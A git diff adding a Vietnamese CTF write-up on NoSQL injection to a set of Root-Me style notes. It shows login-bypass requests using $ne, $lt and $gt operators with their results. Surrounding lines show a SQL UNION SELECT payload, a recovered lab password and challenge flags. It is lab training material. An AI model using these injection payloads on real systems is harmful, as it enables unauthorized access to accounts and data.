@@ -34,6 +34,28 @@ payload: recherche=1' union select username,password from users--
 => username = admin , password = c4K04dtIaJsuWdi
 ```
 
+## 47. NoSQL injection - Authentication
+- Mở đầu thì thấy form đăng nhập thì đây là lỗi về nosql.
+- Bật burp suite thao tác cho dễ.
+- Đầu tiên vẫn dùng admin và admin thì nhận về bị bad request.
+- Dùng cú pháp của nosql xem thử.
+```js
+GET /web-serveur/ch38/?login[$ne]=admin&pass[$ne]=admin HTTP/1.1
+
+$ne: là so sánh không bằng (khác)
+You are connected as : test
+```
+- Chuyển sang so sánh với test xem.
+```js
+GET /web-serveur/ch38/?login[$ne]=test&pass[$ne]=admin
+You are connected as : admin
+```
+- Có nghĩa là ngoài test và admin còn một số user khác nên dùng $lt(lest than) và $gt(greater than) để xem khoảng ở giữa.
+```js
+GET /web-serveur/ch38/?login[$lt]=test&login[$gt]=admin&pass[$ne]=admin
+You are connected as : flag{nosqli_no_secret_4_you}
+```
+
 ## 50. SQL injection - Numeric
 - Đầu tiên họ cho 1 form đăng nhập sau khi dò thì tìm được lỗi sql trên thanh url và dùng SQLite3.
 - Đầu tiên vẫn kiểm tra số cột có thể tấn công.
@@ -139,3 +161,5 @@ password = 12345678
 
 Well done ! Flag de validation / Validation flag : J41m3Qu4nD54Tr0nc
 ```
+
+
